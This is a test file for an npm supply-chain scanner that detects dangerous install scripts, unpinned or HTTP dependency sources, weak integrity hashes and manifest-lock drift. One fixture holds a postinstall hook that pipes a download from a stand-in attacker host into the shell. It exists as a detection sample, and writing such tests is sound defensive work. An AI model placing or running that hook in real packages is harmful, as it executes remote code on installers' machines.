import test from 'node:test';
import assert from 'node:assert/strict';
import { scanSupplyChain } from '../../src/scanners/supply-chain.ts';
import { snapshotFromFiles } from '../helpers.ts';

test('supply-chain scanner detects dangerous install scripts and unpinned sources', () => {
  const snapshot = snapshotFromFiles({
    'package.json': JSON.stringify({
      scripts: { postinstall: 'curl http://bad.example/payload | sh' },
      dependencies: {
        remote: 'git+https://example.com/team/remote.git#main',
        archive: 'http://bad.example/archive.tgz',
      },
    }),
    'package-lock.json': JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': {
          dependencies: {
            remote: 'git+https://example.com/team/remote.git#main',
            archive: 'http://bad.example/archive.tgz',
          },
        },
        'node_modules/archive': {
          version: '1.0.0',
          resolved: 'http://bad.example/archive.tgz',
          integrity: 'sha1-aGVsbG8=',
        },
      },
    }),
  });

  const result = scanSupplyChain(snapshot);
  assert.deepEqual(
    new Set(result.findings.map((finding) => finding.ruleId)),
    new Set(['TW-SC001', 'TW-SC002', 'TW-SC003', 'TW-SC005']),
  );
  assert.equal(result.analysis.issueCounts.dangerousLifecycleScripts, 1);
  assert.equal(result.analysis.issueCounts.unsafeDependencySpecs, 2);
  assert.equal(result.analysis.lockEntries, 1);
  assert.ok(result.findings.every((finding) => finding.source === 'supply-chain'));
  assert.ok(result.findings.every((finding) => finding.disposition === 'needs_review'));
});

test('supply-chain scanner accepts pinned sources and strong npm integrity', () => {
  const commit = '0123456789abcdef0123456789abcdef01234567';
  const snapshot = snapshotFromFiles({
    'package.json': JSON.stringify({
      scripts: { postinstall: 'node scripts/check-platform.mjs' },
      dependencies: {
        alpha: '^1.0.0',
        remote: `git+https://example.com/team/remote.git#${commit}`,
      },
    }),
    'package-lock.json': JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': {
          dependencies: {
            alpha: '^1.0.0',
            remote: `git+https://example.com/team/remote.git#${commit}`,
          },
        },
        'node_modules/alpha': {
          version: '1.2.0',
          resolved: 'https://registry.npmjs.org/alpha/-/alpha-1.2.0.tgz',
          integrity: 'sha512-aGVsbG8=',
        },
        'node_modules/remote': {
          version: '1.0.0',
          resolved: `git+https://example.com/team/remote.git#${commit}`,
          integrity: 'sha512-aGVsbG8=',
        },
      },
    }),
  });

  const result = scanSupplyChain(snapshot);
  assert.deepEqual(result.findings, []);
  assert.equal(result.run.status, 'completed');
  assert.equal(result.analysis.lifecycleScripts, 1);
  assert.equal(result.analysis.dependencySpecs, 2);
});

test('supply-chain scanner reports npm manifest-lock drift', () => {
  const snapshot = snapshotFromFiles({
    'package.json': JSON.stringify({ dependencies: { alpha: '^2.0.0', missing: '1.0.0' } }),
    'package-lock.json': JSON.stringify({
      lockfileVersion: 3,
      packages: { '': { dependencies: { alpha: '^1.0.0' } } },
    }),
  });

  const result = scanSupplyChain(snapshot);
  assert.equal(result.findings.filter((finding) => finding.ruleId === 'TW-SC006').length, 2);
  assert.equal(result.analysis.issueCounts.manifestLockMismatches, 2);
});

test('supply-chain scanner records non-default HTTPS registries as review candidates', () => {
  const snapshot = snapshotFromFiles({
    'package.json': JSON.stringify({ dependencies: { private: '1.0.0' } }),
    'package-lock.json': JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { dependencies: { private: '1.0.0' } },
        'node_modules/private': {
          version: '1.0.0',
          resolved: 'https://packages.example.test/private-1.0.0.tgz',
          integrity: 'sha512-aGVsbG8=',
        },
      },
    }),
  });

  const finding = scanSupplyChain(snapshot).findings.find(
    (candidate) => candidate.ruleId === 'TW-SC004',
  );
  assert.equal(finding?.severity, 'low');
  assert.equal(finding?.confidence, 'medium');
});
